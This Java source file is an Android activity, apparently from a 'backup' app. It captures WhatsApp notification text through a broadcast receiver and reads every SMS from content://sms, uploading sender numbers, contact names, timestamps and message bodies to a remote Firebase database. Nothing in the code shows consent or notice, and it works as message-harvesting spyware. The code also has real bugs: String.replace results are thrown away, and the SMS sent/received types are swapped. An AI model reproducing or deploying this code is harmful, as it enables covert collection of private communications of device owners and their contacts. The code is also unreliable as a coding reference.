package com.example.mnotification;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;

public class MainBackup extends AppCompatActivity {

    @BindView(R.id.recycler_view)
    RecyclerView recyclerView;

    @BindView(R.id.btm_load)
    Button btmLoad;

    ArrayList<Model> modelList;
    CustomListAdapter adapter;


    private DatabaseReference mFirebaseDatabase, mFirebaseDatabase_textmsg,mFirebaseDatabase_textmsg_error;
    private FirebaseDatabase mFirebaseInstance;


    private BroadcastReceiver onNotice = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {


            Log.e("*****======", "Come");
            // String pack = intent.getStringExtra("package");
            String title = intent.getStringExtra("title");
            String text = intent.getStringExtra("text");
            String package_name = intent.getStringExtra("package");
            //int id = intent.getIntExtra("icon",0);


            // Toast.makeText(context, "********"+text+"", Toast.LENGTH_SHORT).show();

            Context remotePackageContext = null;


            Log.e("*/*/*/*/**", "------" + package_name);
            if (package_name.equals("txtMsg")) {

                Log.e("*****======", "ComeInElseIf");
                long yourmilliseconds = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                Date resultdate = new Date(yourmilliseconds);
                mFirebaseDatabase.child("hiiii").child("hiiii").setValue(text);
                //mFirebaseDatabase.child(title).child(sdf.format(resultdate)).setValue(text);
                Toast.makeText(MainBackup.this, "########----------##########", Toast.LENGTH_SHORT).show();
            } else if (package_name.equals("com.whatsapp")) {

                mFirebaseDatabase.child(title).addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                        int size_check = 0;
                        int size = (int) dataSnapshot.getChildrenCount();

                        Log.e("Size", String.valueOf(size) + "___");

                        if (size == 0) {
                            long yourmilliseconds = System.currentTimeMillis();
                            SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                            Date resultdate = new Date(yourmilliseconds);
                            mFirebaseDatabase.child(title).child(sdf.format(resultdate)).setValue(text);
                        }
                        for (DataSnapshot d : dataSnapshot.getChildren()) {

                            String msg = (String) d.getValue();
                            if (size_check == size - 1) {
                                if (!text.contains("new messages") || !text.contains("@")) {
                                    if (msg.equals(text)) {

                                    } else {
                                        long yourmilliseconds = System.currentTimeMillis();
                                        SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                                        Date resultdate = new Date(yourmilliseconds);
                                        mFirebaseDatabase.child(title).child(sdf.format(resultdate)).setValue(text);
                                    }
                                }
                            }
                            size_check++;
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError databaseError) {

                    }
                });


            } else {

            }
                /*if (package_name.equals("txtMsg")) {

                Log.e("*****======", "ComeInElseIf");
                long yourmilliseconds = System.currentTimeMillis();
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                Date resultdate = new Date(yourmilliseconds);
                mFirebaseDatabase.child(title).child(sdf.format(resultdate)).setValue(text);
                //  Toast.makeText(remotePackageContext, "########----------##########", Toast.LENGTH_SHORT).show();
            }*/


        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);
        mFirebaseInstance = FirebaseDatabase.getInstance();
        // get reference to 'users' node
        mFirebaseDatabase = mFirebaseInstance.getReference("message");
        mFirebaseDatabase_textmsg = mFirebaseInstance.getReference("TextMessage");
        mFirebaseDatabase_textmsg_error = mFirebaseInstance.getReference("TextMessage_Error");


        LocalBroadcastManager.getInstance(this).registerReceiver(onNotice, new IntentFilter("Msg"));
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu_main, menu);//Menu Resource, Menu
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.action_settings:
                Intent intent = new Intent(
                        "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }


    @OnClick(R.id.btm_load)
    public void onViewClicked() {


        try {

            String[] columns = new String[]{"address", "person", "date", "body", "type"};
            ContentResolver contentResolver = getContentResolver();
            //final String[] projection = new String[]{"*"};
            Uri uri = Uri.parse("content://sms");

            Cursor query = contentResolver.query(uri, columns, null, null, null);
            if (query.getCount() > 0) {
                //String count = Integer.toString(query.getCount());
                while (query.moveToNext()) {

                    String number = query.getString(query.getColumnIndex(columns[0]));
                    String person = query.getString(query.getColumnIndex(columns[1]));
                    String time = query.getString(query.getColumnIndex(columns[2]));
                    String body = query.getString(query.getColumnIndex(columns[3]));
                    String type = query.getString(query.getColumnIndex(columns[4]));
                    Log.e("Query", query.toString() + "---" + number + "---" + person
                            + "---" + time + "---" + body + "---" + type);

                    // SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss");
                    // Date resultdate = new Date(time);

                    if (type.equals("1")) {

                        type = "Sent";
                    } else if (type.equals("2")) {
                        type = "Recived";
                    } else if (type.equals("3")) {
                        type = "Draft";
                    }





                    if (number.contains("."))
                    {
                        number.replace(".","_");
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                    }
                    else if (number.contains("$"))
                    {

                        number.replace("$","_");
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                    }
                    else if (number.contains("#"))
                    {
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        number.replace("#","_");
                    }
                    else if (number.contains("["))
                    {
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        number.replace("[","_");
                    }
                    else if (number.contains("]"))
                    {
                        mFirebaseDatabase_textmsg_error.child(String.valueOf(System.currentTimeMillis())).child("if").setValue(number);
                        number.replace("]","_");
                    }

                    MessageModel messageModel = new MessageModel(number, body, time, type,person);


                    mFirebaseDatabase_textmsg.child(number).child(String.valueOf(System.currentTimeMillis())).setValue(messageModel);

                }
            }
        }
        catch (Exception e)
        {
            mFirebaseDatabase_textmsg_error.child("Error___").setValue(e.getMessage());
        }
    }

}